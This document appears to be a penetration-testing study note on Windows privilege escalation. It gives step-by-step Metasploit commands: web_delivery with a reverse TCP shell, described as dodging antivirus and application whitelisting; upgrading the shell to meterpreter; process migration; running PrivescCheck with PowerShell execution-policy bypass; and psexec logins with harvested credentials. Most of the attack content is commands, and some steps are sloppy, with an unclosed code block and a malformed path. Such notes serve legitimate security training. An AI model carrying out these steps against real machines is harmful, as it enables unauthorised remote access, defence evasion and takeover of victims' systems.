
Privilege Escalation differs based on the target version of Windows and the system configuration.

### 1.Identify Privilege Escalation Vulnerabilities

\-Use PrivescCheck(https://github.com/itm4n/PrivescCheck/blob/master/README.md)

After gaining access to the target computer, upload the PrivescCheck script and execute it with PowerShell. This script will identify privilege escalation vulnerabilities. 

If the target doesn't have any vulnerable services running, we can use metasploit Web Delivery to get access to the system.


---

## Metasploit Web Delivery

If the target doesn't have any vulnerable services running, we can use metasploit Web Delivery to get access to the system.

This module quickly fires up a web server that serves a payload. The module will provide a command to be run on the target machine based on the selected target. The priveded command will download and execute a payload using either a specified scripting language interpreter or "squiblydoo" via regsvr32.exe for bypassing application whitelisting. The main purpose of this module is to quickly establish a session on a target machine when the attacker has to manually type in the command: e.g. Command Injection, RDP Session, Local Access etc. This attack vector does not write to disk so it is less likely to trigger AV.

See available targets

```plaintext
show targets
```

_For example, set the target to powershell_

```plaintext
set target PSH
set target PSH\ (Binary)
```

_Set the payload for a simple command shell session_

```plaintext
set payload windows/shell/reverse_tcp
```

_We can disable powershell code for being encoded in BASE64\*_

```plaintext
set PSH-EncodedCommand false
```

```plaintext
set LHOST eth1
```

After running the “exploit” command, it will generate a powershell code wich must be manually copied to the victim system cmd. After that, check metasploit for a new session in wich we should have simple command shell session on the target.


After that, check metasploit for a new session in which we should have simple command shell session on the target.

```plaintext
sessions
```

Migrate this command shell session to a meterpreter session. Put this session in the background

```plaintext
ctrl+z
```

or

```plaintext
background
```

search for shell\_to\_meterpreter module and use it.

```plaintext
search shell_to
```

set the options in shell\_to\_meterpreter module

```plaintext
set LHOST eth1
set SESSION 1 (the id of the command shell session)
```

```plaintext
show advanced
```

Set the transfer method from power shell to visual basic

```plaintext
set win_transfer VBS
```

```plaintext
exploit
```

A meterpreter session should start. 

list all the sessions and chose the meterpreter session

```plaintext
sessions
sessions 2
```

Learn more about the target system

```plaintext
sysinfo
```

Migrate to 64 bit if meterpreter session is on 32 bit. For this, we must list running processes and migrate to explorer.exe on 64.

```plaintext
ps
migrate 2604

Do some enumeration

```plaintext
getuid
getprivs
```

Now we can use privescCheck

Navigate to the place where you downloaded priseccheck

```plaintext
cd :C\\
cd Users
cd Desktop
cd PrivescCheck
dir
```

Then copy on of the command from the github page (https://github.com/itm4n/PrivescCheck/blob/master/README.md)

```plaintext
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
```
## 2.Windows Privilege Escalation

#### \- Elevate privileges using login credentials found with privescCheck in Winlogon registry keys.

**Using: SMB, psexec.py**

```plaintext
 psexec.py admin@10.10.10.10
<Password:> 1234
```

**Using Metasploit**

```plaintext
search psexec
```
```plaintext
search psexec
```

```plaintext
use exploit/windows/smb/psexec
```

Set all required options + SMB user and password.

```plaintext
exploit
```

check for other privilege escalation techniques in System and Host Based Attacks, Metasploit Framework.
